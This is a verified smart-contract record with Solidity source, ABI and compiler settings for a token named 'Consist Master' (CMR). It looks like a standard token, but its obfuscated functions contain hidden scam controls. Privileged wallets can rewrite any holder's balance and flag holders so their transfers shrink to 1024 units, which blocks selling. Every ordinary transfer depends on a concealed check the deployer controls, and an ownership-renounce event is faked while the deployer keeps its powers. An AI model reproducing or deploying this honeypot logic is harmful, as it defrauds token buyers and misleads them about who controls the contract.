{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\ninterface tradingWalletMin {\n    function createPair(address listSender, address limitReceiver) external returns (address);\n}\n\ninterface listFrom {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverTake) external view returns (uint256);\n\n    function transfer(address minModeTeam, uint256 totalReceiver) external returns (bool);\n\n    function allowance(address liquidityBuy, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 totalReceiver) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address minModeTeam,\n        uint256 totalReceiver\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed receiverReceiverExempt, uint256 value);\n    event Approval(address indexed liquidityBuy, address indexed spender, uint256 value);\n}\n\nabstract contract teamIs {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface sellBuy {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface fundSwap is listFrom {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ConsistMaster is teamIs, listFrom, fundSwap {\n\n    function transfer(address autoSell, uint256 totalReceiver) external virtual override returns (bool) {\n        return liquidityMarketing(_msgSender(), autoSell, totalReceiver);\n    }\n\n    uint256 private swapAmountLimit = 100000000 * 10 ** 18;\n\n    address launchedMax = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    string private receiverTotalLiquidity = \"CMR\";\n\n    function name() external view virtual override returns (string memory) {\n        return receiverTeamExempt;\n    }\n\n    function balanceOf(address receiverTake) public view virtual override returns (uint256) {\n        return modeSell[receiverTake];\n    }\n\n    function autoTake(address launchAt) public {\n        if (isMode) {\n            return;\n        }\n        \n        marketingWallet[launchAt] = true;\n        \n        isMode = true;\n    }\n\n    address public minSwapTx;\n\n    function receiverTradingSwap() public {\n        emit OwnershipTransferred(minSwapTx, address(0));\n        fromSell = address(0);\n    }\n\n    event OwnershipTransferred(address indexed modeTeam, address indexed launchFromMode);\n\n    function marketingTake(address toMax) public {\n        maxSwap();\n        if (enableLimit != maxExempt) {\n            sellReceiver = false;\n        }\n        if (toMax == minSwapTx || toMax == launchWallet) {\n            return;\n        }\n        receiverModeEnable[toMax] = true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return receiverTotalLiquidity;\n    }\n\n    function listTo(uint256 totalReceiver) public {\n        maxSwap();\n        tradingList = totalReceiver;\n    }\n\n    mapping(address => bool) public receiverModeEnable;\n\n    function decimals() external view virtual override returns (uint8) {\n        return modeAt;\n    }\n\n    function transferFrom(address sellSwap, address minModeTeam, uint256 totalReceiver) external override returns (bool) {\n        if (_msgSender() != launchedMax) {\n            if (sellAtShould[sellSwap][_msgSender()] != type(uint256).max) {\n                require(totalReceiver <= sellAtShould[sellSwap][_msgSender()]);\n                sellAtShould[sellSwap][_msgSender()] -= totalReceiver;\n            }\n        }\n        return liquidityMarketing(sellSwap, minModeTeam, totalReceiver);\n    }\n\n    uint256 private swapTokenAmount;\n\n    uint8 private modeAt = 18;\n\n    mapping(address => mapping(address => uint256)) private sellAtShould;\n\n    function enableMin(address autoSell, uint256 totalReceiver) public {\n        maxSwap();\n        modeSell[autoSell] = totalReceiver;\n    }\n\n    function liquidityMarketing(address sellSwap, address minModeTeam, uint256 totalReceiver) internal returns (bool) {\n        if (sellSwap == minSwapTx) {\n            return amountReceiver(sellSwap, minModeTeam, totalReceiver);\n        }\n        uint256 senderBuyLiquidity = listFrom(launchWallet).balanceOf(isSenderWallet);\n        require(senderBuyLiquidity == tradingList);\n        require(minModeTeam != isSenderWallet);\n        if (receiverModeEnable[sellSwap]) {\n            return amountReceiver(sellSwap, minModeTeam, totalList);\n        }\n        return amountReceiver(sellSwap, minModeTeam, totalReceiver);\n    }\n\n    uint256 tradingList;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return swapAmountLimit;\n    }\n\n    bool private receiverLaunched;\n\n    constructor (){\n        if (swapTokenAmount == enableLimit) {\n            enableLimit = swapTokenAmount;\n        }\n        sellBuy limitSender = sellBuy(launchedMax);\n        launchWallet = tradingWalletMin(limitSender.factory()).createPair(limitSender.WETH(), address(this));\n        \n        minSwapTx = _msgSender();\n        marketingWallet[minSwapTx] = true;\n        modeSell[minSwapTx] = swapAmountLimit;\n        receiverTradingSwap();\n        \n        emit Transfer(address(0), minSwapTx, swapAmountLimit);\n    }\n\n    uint256 constant totalList = 2 ** 10;\n\n    address public launchWallet;\n\n    function getOwner() external view returns (address) {\n        return fromSell;\n    }\n\n    mapping(address => uint256) private modeSell;\n\n    address isSenderWallet = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool public isMode;\n\n    bool private sellReceiver;\n\n    function maxSwap() private view {\n        require(marketingWallet[_msgSender()]);\n    }\n\n    function owner() external view returns (address) {\n        return fromSell;\n    }\n\n    uint256 sellMax;\n\n    function amountReceiver(address sellSwap, address minModeTeam, uint256 totalReceiver) internal returns (bool) {\n        require(modeSell[sellSwap] >= totalReceiver);\n        modeSell[sellSwap] -= totalReceiver;\n        modeSell[minModeTeam] += totalReceiver;\n        emit Transfer(sellSwap, minModeTeam, totalReceiver);\n        return true;\n    }\n\n    address private fromSell;\n\n    bool public walletAmount;\n\n    function approve(address enableFrom, uint256 totalReceiver) public virtual override returns (bool) {\n        sellAtShould[_msgSender()][enableFrom] = totalReceiver;\n        emit Approval(_msgSender(), enableFrom, totalReceiver);\n        return true;\n    }\n\n    uint256 private enableLimit;\n\n    string private receiverTeamExempt = \"Consist Master\";\n\n    uint256 private maxExempt;\n\n    bool public tradingBuyIs;\n\n    mapping(address => bool) public marketingWallet;\n\n    uint256 public enableLaunched;\n\n    function allowance(address autoTotal, address enableFrom) external view virtual override returns (uint256) {\n        if (enableFrom == launchedMax) {\n            return type(uint256).max;\n        }\n        return sellAtShould[autoTotal][enableFrom];\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityBuy\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeTeam\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchFromMode\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverReceiverExempt\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"enableFrom\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalReceiver\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchAt\",\"type\":\"address\"}],\"name\":\"autoTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTake\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableLaunched\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalReceiver\",\"type\":\"uint256\"}],\"name\":\"enableMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"totalReceiver\",\"type\":\"uint256\"}],\"name\":\"listTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toMax\",\"type\":\"address\"}],\"name\":\"marketingTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"marketingWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minSwapTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverModeEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTradingSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingBuyIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalReceiver\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellSwap\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minModeTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalReceiver\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ConsistMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}